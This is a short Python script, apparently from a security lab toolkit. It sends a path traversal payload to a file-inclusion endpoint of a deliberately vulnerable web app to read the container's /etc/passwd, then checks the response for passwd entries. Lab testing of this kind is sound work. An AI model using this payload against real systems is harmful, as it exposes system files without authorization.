
from attacks.common import create_session, send_request, display_result

ENDPOINT = "/vulnerabilities/fi/"


def run_traversal_test():
    print("\n[Traversal] Starting local path traversal test")

    session = create_session()

    # Five parent-directory traversals to reach the
    # container's root-level /etc/passwd file.
    payload = "../../../../../etc/passwd"

    try:
        response = send_request(
            session=session,
            endpoint=ENDPOINT,
            params={"page": payload}
        )

        display_result("Path Traversal Test", response)

        indicators = (
            "root:x:",
            "daemon:x:",
            "nobody:x:"
        )

        detected = any(
            indicator in response.text
            for indicator in indicators
        )

        print(f"Local file content detected: {detected}")

    finally:
        session.close()


if __name__ == "__main__":
    run_traversal_test()
